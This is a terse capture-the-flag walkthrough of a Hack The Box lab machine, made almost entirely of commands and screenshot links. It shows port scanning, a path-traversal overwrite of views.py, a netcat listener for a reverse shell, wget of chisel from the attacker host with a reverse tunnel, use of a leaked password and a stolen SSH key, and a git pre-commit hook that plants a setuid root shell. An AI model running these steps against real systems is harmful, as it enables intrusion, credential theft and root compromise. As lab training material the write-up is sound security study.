```
nmap -sS -sC -sV -T5 -Pn 10.10.11.164
```
![image](https://github.com/regarmulia/HTB/assets/33616880/bd23ea8e-8d62-47e6-b5dc-85b954b967a3)


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.11.164/FUZZ -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/5795739c-4a17-4504-8488-d1ace66b3196)


```
source.zip
git log
```
![image](https://github.com/regarmulia/HTB/assets/33616880/e3fad636-4220-495e-bb1d-56e184b5896c)

![image](https://github.com/regarmulia/HTB/assets/33616880/d789400c-a783-427a-912f-402b6a3abb62)

![image](https://github.com/regarmulia/HTB/assets/33616880/259419d5-99bc-40eb-93a0-9564fe70068c)


```
http://10.10.11.164/upcloud
sample
```
![image](https://github.com/regarmulia/HTB/assets/33616880/b4583816-0a36-4f81-9a89-397b094bae2e)


```
Views.py
```
![image](https://github.com/regarmulia/HTB/assets/33616880/193201c3-0cea-4314-a186-70c17f23143e)


```
..//app/app/views.py
```
![image](https://github.com/regarmulia/HTB/assets/33616880/6d1f0daa-1966-4db5-b468-26485f7bd868)

![image](https://github.com/regarmulia/HTB/assets/33616880/0b21c820-b480-440a-94f3-4b8412476caf)


```
nc -lvnp 443
http://10.10.11.164/0xdf
```
![image](https://github.com/regarmulia/HTB/assets/33616880/3435d421-6ef9-4832-abe4-507d7b8c0462)


```
ifconfig
```
![image](https://github.com/regarmulia/HTB/assets/33616880/187abd6f-a957-4a27-a578-4ec59fe32b48)


```
wget http://10.10.14.2:8000/chisel_1.9.0_linux_amd64
```
![image](https://github.com/regarmulia/HTB/assets/33616880/710b1a2f-ba49-4b90-909f-c340735bdc2d)


```
/chisel_1.9.0_linux_amd64 server -p 8000 –reverse
./chisel_1.9.0_linux_amd64 client 10.10.14.2:8000 R:3000:172.17.0.1:3000
```
![image](https://github.com/regarmulia/HTB/assets/33616880/2f932b94-17a3-440f-946b-43b1885d3c3f)

![image](https://github.com/regarmulia/HTB/assets/33616880/261f4c2e-61ba-4924-b826-e91e62068968)


```
http://127.0.0.1:3000/
Soulless_Developer#2022
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c4e06b02-b002-47d4-8f27-9874144fdb20)


```
http://127.0.0.1:3000/dev01/home-backup/src/branch/main/.ssh/id_rsa
```
![image](https://github.com/regarmulia/HTB/assets/33616880/111d3d4a-6636-4f38-b2b0-24b20a9030ca)


```
ssh -i id_rsa dev01@10.10.11.164
```
![image](https://github.com/regarmulia/HTB/assets/33616880/253a8ec4-8df2-4dfd-9717-acc2eaabe53f)


```
./pspy64
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0370c502-059d-4b9c-8101-6b96ae788174)

![image](https://github.com/regarmulia/HTB/assets/33616880/7cca059c-705b-4052-b79d-67c0fd5a91fe)


```
/usr/local/bin/git-sync
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
ls -l /tmp/0xdf
/tmp/0xdf -p
```
